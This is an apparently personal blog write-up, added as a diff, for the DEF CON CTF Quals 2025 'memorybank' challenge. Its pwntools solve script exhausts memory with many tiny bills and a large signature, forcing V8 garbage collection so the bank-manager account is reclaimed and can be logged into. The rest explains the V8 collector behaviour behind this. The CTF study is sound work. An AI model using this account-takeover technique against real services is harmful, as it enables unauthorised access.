@@ -1,0 +1,483 @@
+---
+title: 'DEF CON CTF Quals 2025 memorybank Write-Up: Investigating V8 Garbage Collector'
+date: 2025-04-16T16:06:21+08:00
+image: memorybank.png
+lang: en
+tags:
+-   writeup
+-   ctf
+---
+
+Write-up for [memorybank](https://github.com/Nautilus-Institute/quals-2025/tree/main/memorybank) in DEF CON CTF Quals 2025. Particularly:
+
+-   Why random username?
+-   Why `setTimeout`?
+-   Why large signature?
+-   Why `Uint8Array`?
+
+<Excerpt />
+
+<Card title="TL;DR: the answers to these three questions" fold>
+
+<Card type="warn" title="Do you really want to skip to the answers?" fold>
+
+-   Weakly referenced objects that have been accessed in the same job are not garbage collected. `getUserByUsername` accesses the bank manager, but using a random username does not. `setTimeout` creates a separate job for the `user` function.
+
+-   There are two types of garbage collection, minor GC and major GC. Weakly referenced objects are reclaimed only in the major GC.
+
+-   `ArrayBuffer` can cause external memory pressure and immediately trigger a major GC, where the normal heap memory usage can only trigger minor GCs and schedule a major GC that is not immediately started.
+
+</Card>
+
+</Card>
+
+It is the most solved challenge in this event, surpassing the basic challenge “🐱‍💻🌐”. However, I bet that most people did not fully understand how the solution worked, or why the alternatives did not.
+
+(Un)fortunately, I did not try hard enough to guess different approaches and hit the correct one, but instead *wasted* my time figuring out the underlying mechanisms about the V8 garbage collector before getting the flag (and during writing this write-up).[^flow]
+
+Here’s the write-up. (My longest write-up for a single challenge, a most solved challenge :)
+
+[^flow]: Opposite to what I did during the event, in this write-up, I present the correct solution and raise questions to it before investigating the underlying mechanisms. And I actually made some incorrect hypotheses during the event and found that they are wrong when writing this write-up. I spent some more time investigating it and I was kind of busy, so this write-up is posted one month after the event.
+
+## Solve the Challenge
+
+In this challenge, we can log in to a bank system and withdraw bills. If we log in as the bank manager, we will get the flag.
+
+The users are stored in an array of `WeakRef`, so we will be able to log in as the bank manager if the `User` object for the manager is not strongly referenced and reclaimed by the garbage collector.
+
+Each withdrawn bill is stored as a `Bill` object including a `signature` field, which may occupy a substantial amount of memory. If we run out of available memory, we can trigger GC and the bank manager will hopefully be reclaimed.
+
+There are two ways to occupy more memory:
+
+1.  Make many bills.
+2.  Make each bill large.
+
+There is a list of valid options for the bill denomination, but the user input not actually checked, so we can get lots of bills be entering a small denomination like `1e-4` (`0.0001`).
+
+There is no length limit on the signature input, so it can be very large.
+
+Combining these two techniques, we can exhaust the available memory and cause garbage collections, which should remove the bank manager from the memory. So let’s have a try.
+
+<Card type="info" title="Memory Limit">
+
+The `ulimit -m 22400` in `run_challenge.sh` has no effect on modern Linux.[^ulimit-m] I asked the admin on Discord how memory usage was limited on remote but did not get a reply. I found that using Docker to set a memory limit behaves similarly to the remote. Some solutions work with certain memory limit methods but not others, so please also set memory usage limit via Docker if you want to reproduce.
+
+[^ulimit-m]: [memory - Does 'ulimit -m' not work on (modern) Linux? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/129587/does-ulimit-m-not-work-on-modern-linux)
+
+</Card>
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+docker = 'docker run --rm -i -m 100m -v ./index.js:/index.js:ro denoland/deno'
+deno = 'deno run --v8-flags=--trace-gc --allow-read /index.js'
+p = process(f'{docker} {deno}', shell=True)
+
+# login
+p.sendlineafter(b'quit):', b'ouuan')
+
+# large signature
+p.sendlineafter(b'5):', b'3')
+p.sendlineafter(b'bills):', b'a' * 10000)
+
+# withdraw 1e4 bills
+p.sendlineafter(b'5):', b'2')
+p.sendlineafter(b'withdraw:', b'1')
+p.sendlineafter(b'denomination:', b'1e-4')
+
+# logout
+p.sendlineafter(b'5):', b'4')
+
+# login as bank manager
+p.sendlineafter(b'quit):', b'bank_manager')
+result = p.recvline().decode()
+print(result)
+
+# capture the flag
+p.sendlineafter(b'6):', b'6')
+p.interactive()
+```
+
+Oops, it does not work. We can even see GC logs from the `--trace-gc` flag, but the bank manager still exists.
+
+```
+1209 ms: Scavenge 6.8 (8.8) -> 6.9 (12.1) MB, pooled: 0 MB, 2.29 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1372 ms: Mark-Compact 8.4 (12.1) -> 8.2 (13.1) MB, pooled: 0 MB, 2.94 / 0.00 ms  (+ 0.5 ms in 0 steps since start of marking, biggest step 0.0 ms, walltime since start of marking 5 ms) (average mu = 0.997, current mu = 0.997) finalize incremental marking via stack guard; GC in old space requested
+```
+
+Are there anything else we can make use of? Wait, why does it allow us to use a random username?
+
+```typescript
+        if (username.toLowerCase() === 'random') {
+          username = `random-${crypto.randomUUID()}`;
+        }
+```
+
+Let’s see what will happen if we use a random username instead…
+
+```diff
+-p.sendlineafter(b'quit):', b'ouuan')
++p.sendlineafter(b'quit):', b'random')
+```
+
+Did it just print the flag?
+
+<Card type="question" title="Q1: Random Username">
+
+Why does the solution work with a random username, but not other usernames?
+
+</Card>
+
+If we read the code more carefully, we might not have an answer to the question above, but we may notice a strange part of the code:
+
+```typescript
+  setTimeout(async () => {
+    await user();
+  }, 1000);
+```
+
+This makes no sense. Why do we need to waste one second here?
+
+```diff
+-  setTimeout(async () => {
+-    await user();
+-  }, 1000);
++  await user();
+```
+
+Well, the flag disappears again...
+
+<Card type="question" title="Q2: setTimeout">
+
+Why does the solution depend on `setTimeout`? And why is the `main` function split into `init` and `user`?
+
+</Card>
+
+When we review the solution further, we may catch another point: We can occupy enough memory by either many bills or large bills, and it seems that we do not need both of them.
+
+If we do not exploit the bill denomination, we can create only 101 bills[^101-balance], and we will need a very long signature. It’s reasonable that this does not work, as it will exceed the buffer length limit somewhere or take too long to send.
+
+[^101-balance]: If I were the challenge writer, I will probably set a lower balance, as I’m afraid if it can be solved without a small denomination.
+
+But what if we create more bills, with only small ones?
+
+```diff
+-# large signature
+-p.sendlineafter(b'5):', b'3')
+-p.sendlineafter(b'bills):', b'a' * 10000)
+-
+-# withdraw 1e4 bills
++# withdraw many small bills
+ p.sendlineafter(b'5):', b'2')
+ p.sendlineafter(b'withdraw:', b'1')
+-p.sendlineafter(b'denomination:', b'1e-4')
++p.sendlineafter(b'denomination:', b'5e-6')
+```
+
+It seems that we have not occupied enough memory and the bank manager still exists.
+
+Let’s tweak the denomination precisely:
+
+-   `4.9e-6` → <span class="text-error">Out of memory</span>
+-   `4.95e-6` → <span class="text-error">User already exists</span>
+-   `4.925e-6` → <span class="text-error">User already exists</span>
+-   `4.9125e-6` → <span class="text-error">Out of memory</span>
+-   ……
+
+Do we really need to be that precise? Let’s try with a large signature again:
+
+-   `'a' * 10000` & `1e-4` → <span class="text-success">flag</span>
+-   `'a' * 7000` & `1e-4` → <span class="text-success">flag</span>
+-   `'a' * 5000` & `1e-4` → <span class="text-error">User already exists</span>
+-   `'a' * 15000` & `1e-4` → <span class="text-success">flag</span>
+-   `'a' * 20000` & `1e-4` → <span class="text-error">Out of memory</span>
+-   `'a' * 10000` & `1.5e-4` → <span class="text-success">flag</span>
+-   `'a' * 10000` & `2e-4` → <span class="text-error">User already exists</span>
+-   ……
+
+This time we have a large fault tolerance range. So the fact is that we have to use a large signature. Small bills don’t work, and the signature part in the challenge is not redundant.
+
+<Card type="question" title="Q3: Large Signature">
+
+Why do we need to set a large signature? What’s the difference between small bills and large bills, if the total amount of occupied memory is close?
+
+</Card>
+
+If you are even more suspicious, you may find it weird to use a `Uint8Array` for storing the signature.
+
+If it’s directly copied as a `string`, only a reference of the `string` will be stored in each `Bill`, so it will not occupy enough memory. We can verify this by setting the signature to 10000 characters and withdraw one token with a denomination of `5e-6`, and it will neither give the flag nor run out of memory.
+
+```diff
+-    this.signature = new Uint8Array(signature.length);
+-    for (let i = 0; i < signature.length; i++) {
+-      this.signature[i] = signature.charCodeAt(i);
+-    }
++    this.signature = signature;
+```
+
+However, even if we want to clone each character one by one, we can also use a traditional array, instead of the fancy `Uint8Array`:
+
+```diff
+-    this.signature = new Uint8Array(signature.length);
++    this.signature = new Array(signature.length);
+```
+
+The flag disappears again. This time it runs out of memory at a denomination of `6.5e-4` and says the user already exists at `6.6e-4`.
+
+It’s about the `ArrayBuffer`, not the size of each element. `Float64Array` can also be used to get the flag:
+
+```diff
+-    this.signature = new Uint8Array(signature.length);
++    this.signature = new Float64Array(signature.length);
+```
+
+<Card type="question" title="Q4: ArrayBuffer">
+
+Why do we need to use an `ArrayBuffer` instead of a normal array? What’s special about an `ArrayBuffer`?
+
+</Card>
+
+## Inspector, Jobs, and WeakRef
+
+Just like `F12` for the browser, we can also use DevTools for Deno via an inspector.
+
+```diff
+-docker = 'docker run --rm -i -m 100m -v ./index.js:/index.js:ro denoland/deno'
+-deno = 'deno run --v8-flags=--trace-gc --allow-read /index.js'
++docker = 'docker run --rm -i -m 200m --net host -v ./index.js:/index.js:ro denoland/deno'
++deno = 'deno run --inspect-brk --v8-flags=--trace-gc --allow-read index.js'
+```
+
+1.  Modify the command-line arguments as above. We run `deno` with `--inspect-brk` to enable the inspector and pause at the start. We use `--net host` to expose the inspector to the host so that it can be accessed in Chrome. We need to set a larger memory limit or the inspector will not work.
+2.  Run the solve script with a non-random username.
+3.  Open `chrome://inspect` in Chrome. There we can see the remote target and inspect it.
+4.  Set breakpoints by clicking the line numbers in the “Sources” tab. Here we set a breakpoint after creating the bills.
+5.  Click the resume button or press <kbd>F8</kbd>.
+6.  Take a heap snapshot in the “Memory” tab.
+7.  In the snapshot, we can inspect all the objects. Sort them by distance, so that the most relevant ones, `Bill` and `User`, will be listed on the top.
+
+There are two `User` objects, the bank manager and the current user. In the “Retainers” tab, we can see why the selected object is not garbage collected.
+
+The current user is of course retained, as it’s referenced by the `currentUser` variable:
+
+![current user’s retainers, including the currentUser variable](currentUser.png)
+
+What about the bank manager?
+
+![bank manager’s only retainer is weak_refs_keep_during_job](weak_refs_keep_during_job.png)
+
+The only retainer of the bank manager is something called `weak_refs_keep_during_job`. With this hint, we can find the answer in [WeakRef - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakRef#notes_on_weakrefs):
+
+> If your code has just created a `WeakRef` for a target object, or has gotten a target object from a `WeakRef`'s `deref` method, that target object will not be reclaimed until the end of the current JavaScript job (including any promise reaction jobs that run at the end of a script job). That is, you can only "see" an object get reclaimed between turns of the event loop.
+
+Even if you are not familiar with the JavaScript event loop, you may have already grasped how it works:
+
+-   When we set a username by ourselves, the input is checked for duplicate by accessing existing users, which will dereference the `WeakRef` containing the bank manager, preventing it from being reclaimed during the current job. However, when using a random username, that branch will not access the bank manager.
+-   The `setTimeout` creates a separate job to run the `user` function, while the bank manager is created outside in the `init` function.
+
+To learn more about JavaScript jobs, you can read [Event loop: microtasks and macrotasks - javascript.info](https://javascript.info/event-loop), ~~or the [EMCAScript specification](https://tc39.es/ecma262/multipage/executable-code-and-execution-contexts.html#job) (really?)~~.
+
+<Card type="hint" title="Bonus: GC at breakpoint">
+
+If you set a breakpoint in the inspector before `getUserByUsername` is called, the bank manager will disappear, because the breakpoint causes GC when the bank manager is not yet accessed in the current job.
+
+</Card>
+
+## Major/Minor GC and WeakRef
+
+In order to understand the remaining [Q3](#q3-large-signature) and [Q4](#q4-arraybuffer), we need to dive deeper into how the garbage collector works, e.g. through [A tour of V8: Garbage Collection](https://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection), [Trash talk: the Orinoco garbage collector](https://v8.dev/blog/trash-talk), or you can search for other blog posts that might be more accessible for you.
+
+The garbage collector splits the memory heap into two spaces, the new space to store the young generation objects, and the old space to store the old ones. A minor GC (Scavenge) happens frequently to collect some short-lived objects, while a major GC happens much less frequently to collect the remaining objects.
+
+Let’s see it in action first.
+
+<Card title="Change the buffer setting">
+
+Because the outputs are piped into pwntools, we need to use a line buffer (or disable the buffer) instead of a block buffer so that the GC logs are displayed at the right time, otherwise all logs might be outputted at once when the program exits.
+
+```diff
+-deno = 'deno run --v8-flags=--trace-gc --allow-read index.js'
++deno = 'stdbuf -oL deno run --v8-flags=--trace-gc --allow-read index.js'
+```
+
+</Card>
+
+With a large signature:
+
+```
+1186 ms: Scavenge 6.9 (8.1) -> 6.8 (9.1) MB, pooled: 0 MB, 1.52 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1202 ms: Scavenge 6.9 (9.1) -> 6.9 (12.1) MB, pooled: 0 MB, 3.04 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1422 ms: Mark-Compact 8.5 (12.1) -> 8.3 (13.1) MB, pooled: 0 MB, 33.82 / 0.00 ms  (+ 18.8 ms in 0 steps since start of marking, biggest step 0.0 ms, walltime since start of marking 66 ms) (average mu = 0.968, current mu = 0.968) finalize incremental marking via stack guard; GC in old space requested
+```
+
+With a small signature or normal array instead of `ArrayBuffer`:
+
+```
+1107 ms: Scavenge 6.9 (7.9) -> 6.8 (8.9) MB, pooled: 0 MB, 4.81 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1117 ms: Scavenge 6.9 (8.9) -> 6.9 (11.6) MB, pooled: 0 MB, 3.58 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1128 ms: Scavenge 8.8 (11.9) -> 8.7 (12.1) MB, pooled: 0 MB, 1.58 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1131 ms: Scavenge 8.9 (12.1) -> 8.9 (17.9) MB, pooled: 0 MB, 2.50 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1153 ms: Scavenge 12.9 (18.1) -> 12.8 (26.6) MB, pooled: 0 MB, 4.72 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1182 ms: Scavenge 17.3 (26.8) -> 17.4 (46.8) MB, pooled: 0 MB, 6.31 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1246 ms: Scavenge 30.0 (47.8) -> 29.6 (84.2) MB, pooled: 0 MB, 13.22 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1692 ms: Scavenge 52.0 (86.3) -> 51.2 (160.5) MB, pooled: 0 MB, 227.47 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+```
+
+We can see that there is no `Mark-Compact` (major GC) but only `Scavenge` (minor GC) when using small bills. Now we have two new questions:
+
+<Card type="question" title="Q3.1: Why major GC for reclaiming bank manager?">
+
+Why is the bank manager reclaimed in the major GC but not the minor GC?
+
+</Card>
+
+<Card type="question" title="Q3.2: Why large signature and ArrayBuffer for major GC?">
+
+Why is the major GC triggered when using a large signature and `ArrayBuffer` but not when using a small signature or a normal array?
+
+</Card>
+
+A weak reference does not prevent the referent from being reclaimed by the garbage collector, but it does prevent the Scavenge from reclaiming it. It seems that this is not documented, but we can find it in the V8 source code: [`v8/src/heap/scavenger.cc`](https://github.com/v8/v8/blob/d754357c65d58e98e390f538c1120ac4bf2bc614/src/heap/scavenger.cc#L136-L137):
+
+```cpp
+    // Treat weak references as strong.
+    // TODO(marja): Proper weakness handling in the young generation.
+```
+
+We can verify this with the following code:
+
+```javascript
+const ref = new WeakRef({});
+
+setTimeout(() => {
+  for (let i = 0; i < 100000; i++) {
+    const _ = { a: i };
+  }
+  console.log(ref.deref());
+});
+
+setTimeout(() => {
+  gc();
+  console.log(ref.deref());
+});
+```
+
+```console
+$ deno run --v8-flags=--trace-gc,--expose-gc test.js
+20 ms: Scavenge 6.8 (7.8) -> 5.8 (8.8) MB, pooled: 0 MB, 0.22 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+21 ms: Scavenge 6.8 (8.8) -> 5.8 (8.8) MB, pooled: 0 MB, 0.20 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+{}
+24 ms: Mark-Compact 5.8 (8.8) -> 5.8 (8.6) MB, pooled: 0 MB, 2.14 / 0.00 ms  (average mu = 0.902, current mu = 0.902) testing; GC in old space requested
+undefined
+```
+
+As a weakly referenced object, the bank manager will survive the minor GC and only be reclaimed in a major GC.
+
+## External Memory and Major GC Triggers
+
+So what’s special about an `ArrayBuffer`?
+
+`ArrayBuffer` is allocated in neither the new space nor the old space, but in the external memory outside of the heap. If the external memory exceeds the limit, it will trigger “external memory pressure” and immeidately start a major GC (an [incremental marking](https://v8.dev/blog/concurrent-marking)): [`v8/src/heap/heap.cc`](https://github.com/v8/v8/blob/d754357c65d58e98e390f538c1120ac4bf2bc614/src/heap/heap.cc#L1461-L1484)
+
+```cpp
+  uint64_t soft_limit = external_memory_.soft_limit();
+  if (current <= soft_limit) {
+    return;
+  }
+  TRACE_EVENT2("devtools.timeline,v8", "V8.ExternalMemoryPressure",
+               "external_memory_mb", static_cast<int>((current) / MB),
+               "external_memory_soft_limit_mb",
+               static_cast<int>((soft_limit) / MB));
+  if (incremental_marking()->IsStopped()) {
+    if (incremental_marking()->CanAndShouldBeStarted()) {
+      StartIncrementalMarking(GCFlagsForIncrementalMarking(),
+                              GarbageCollectionReason::kExternalMemoryPressure,
+                              kGCCallbackFlagsForExternalMemory);
+    } else {
+      CollectAllGarbage(i::GCFlag::kNoFlags,
+                        GarbageCollectionReason::kExternalMemoryPressure,
+                        kGCCallbackFlagsForExternalMemory);
+    }
+  } else {
+    // Incremental marking is turned on and has already been started.
+    current_gc_callback_flags_ = static_cast<GCCallbackFlags>(
+        current_gc_callback_flags_ | kGCCallbackFlagsForExternalMemory);
+    incremental_marking()->AdvanceAndFinalizeIfNecessary();
+  }
+```
+
+Where the `soft_limit` is initially 64MiB:
+
+[`v8/src/heap/heap.h`](https://github.com/v8/v8/blob/f370df698197d3db7d6c64647be611c7840ad935/src/heap/heap.h#L243-L245)
+
+```cpp
+    uint64_t soft_limit() const {
+      return low_since_mark_compact() + kExternalAllocationSoftLimit;
+    }
+```
+
+[`v8/include/v8-internal.h`](https://github.com/v8/v8/blob/f370df698197d3db7d6c64647be611c7840ad935/include/v8-internal.h#L1050-L1052)
+
+```cpp
+  // Soft limit for AdjustAmountofExternalAllocatedMemory. Trigger an
+  // incremental GC once the external memory reaches this limit.
+  static constexpr size_t kExternalAllocationSoftLimit = 64 * 1024 * 1024;
+```
+
+This explains why a large `ArrayBuffer` can trigger a major GC, but why not a normal array?
+
+With the `--trace-incremental-marking` V8 flag, we can see that an incremental marking is immediately started when using an `ArrayBuffer`:
+
+```
+1471 ms: [IncrementalMarking] Start (external memory pressure): (size/waste/limit/slack) v8: 6MB / 0MB / 512MB / 506MB global: 6MB / 0MB / 1024MB / 1018MB
+1486 ms: [IncrementalMarking] Start marking
+1494 ms: [IncrementalMarking] Black allocation started
+……
+```
+
+However, it is only scheduled but not started when using a normal array:
+
+```
+1428 ms: Scavenge 66.7 (102.4) -> 63.5 (197.9) MB, pooled: 0 MB, 72.03 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure;
+1428 ms: [IncrementalMarking] Job: Schedule
+```
+
+This scheduling is happened in the [`StartIncrementalMarkingIfAllocationLimitIsReached`](https://github.com/v8/v8/blob/d754357c65d58e98e390f538c1120ac4bf2bc614/src/heap/heap.cc#L2004-L2024) function:
+
+```cpp
+      case IncrementalMarkingLimit::kHardLimit:
+        if (local_heap->is_main_thread_for(this)) {
+          StartIncrementalMarking(
+              gc_flags,
+              OldGenerationSpaceAvailable() <= NewSpaceTargetCapacity()
+                  ? GarbageCollectionReason::kAllocationLimit
+                  : GarbageCollectionReason::kGlobalAllocationLimit,
+              gc_callback_flags);
+        } else {
+          ExecutionAccess access(isolate());
+          isolate()->stack_guard()->RequestStartIncrementalMarking();
+          if (auto* job = incremental_marking()->incremental_marking_job()) {
+            job->ScheduleTask();
+          }
+        }
+        break;
+      case IncrementalMarkingLimit::kSoftLimit:
+        if (auto* job = incremental_marking()->incremental_marking_job()) {
+          job->ScheduleTask(TaskPriority::kUserVisible);
+        }
+        break;
+```
+
+By default, only the soft limit but not the hard limit is hit. If we set the V8 flag `--incremental-marking-hard-trigger=60`, it will hit the hard limit and immediately trigger a major GC.
+
+Congratulations! You have followed this tour and now understand how this seemingly simple CTF challenge actually works, with basic knowledge about the V8 garbage collector.
+
+……But wait, here’s one last question, and I’ll leave it for interesting readers:
+
+<Card type="question" title="Bonus: Small bills in multiple rounds">
+
+Actually, instead of using a large signature, it can also be solved by withdrawing fewer small bills in many rounds (e.g. `1e-4` denomination for 50 rounds). Why?
+
+</Card>
